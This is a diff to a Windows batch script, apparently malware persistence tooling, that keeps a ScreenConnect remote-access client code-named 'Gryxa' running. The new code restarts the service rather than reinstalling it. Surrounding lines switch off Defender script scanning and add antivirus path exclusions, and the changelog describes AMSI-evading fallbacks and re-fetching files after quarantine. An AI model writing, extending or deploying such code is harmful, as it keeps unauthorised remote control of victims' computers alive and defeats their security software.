@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M45
+rem  OWN_MON  BUILD 20260804M46
+rem  M46: START_PENDING = alive; never /x Gryxa while service exists (connect-drop).
 rem  M45: L42 safe FP migrate (install new before removing old Gryxa).
 rem  M44: force_gryxa.flag must NOT /x live Gryxa (L41 force-skip-if-running).
 rem  M43: AMSI-proof Gryxa fallback via own_gryxa.cmd (pure msiexec) when PS blocked/missing.
@@ -44,7 +45,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M45"
+set "MONVER=M46"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -501,7 +502,7 @@ if "%GRYXA_OK%"=="0" call :EnsureGryxaMust
 :GryxaAfter
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 set "GRYXA_OK=0"
-sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
 if not errorlevel 1 set "GRYXA_OK=1"
 rem also OK if verified Gryxa FP (relay/expected) is healthy
 if "%GRYXA_OK%"=="0" (
@@ -555,14 +556,38 @@ exit /b 0
 
 rem ═══════════════ helpers ═══════════════
 :EnsureGryxaMust
-rem M43: try PS lib first; if missing/AMSI-blocked/still down → pure-cmd own_gryxa.cmd
+rem M46: treat START_PENDING as alive; never spawn own_gryxa /x while svc exists
 set "GRYXA_OK=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
+set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
 
 rem soft reg exclusions every must-heal (works even when WinDefend service dead)
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%SystemRoot%\Temp\.upd" /t REG_DWORD /d 0 /f >nul 2>&1
+
+rem alive = RUNNING or START_PENDING (connect race) — do not reinstall
+sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
+if not errorlevel 1 (
+  set "GRYXA_OK=1"
+  echo gryxa_must_already_alive>>"%LOG%"
+  exit /b 0
+)
+
+rem service exists but stopped → start only
+sc query "%GSVC%" >nul 2>&1
+if not errorlevel 1 (
+  echo gryxa_must_start_only>>"%LOG%"
+  sc config "%GSVC%" start= auto >nul 2>&1
+  sc start "%GSVC%" >nul 2>&1
+  timeout /t 8 /nobreak >nul
+  sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+  if not errorlevel 1 (
+    set "GRYXA_OK=1"
+    echo gryxa_must_started_ok>>"%LOG%"
+    exit /b 0
+  )
+)
 
 rem re-fetch lib into TEMP if WD copy missing (AMSI/quarantine wipe)
 if not exist "%WD%\own_lib.ps1" (
@@ -587,7 +612,7 @@ if exist "%LIB%" (
   if not errorlevel 1 timeout /t 15 /nobreak >nul
 )
 
-sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
 if not errorlevel 1 set "GRYXA_OK=1"
 
 if "%GRYXA_OK%"=="0" (
@@ -606,7 +631,7 @@ if "%GRYXA_OK%"=="0" (
   )
 )
 
-sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
 if not errorlevel 1 set "GRYXA_OK=1"
 if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
 exit /b 0
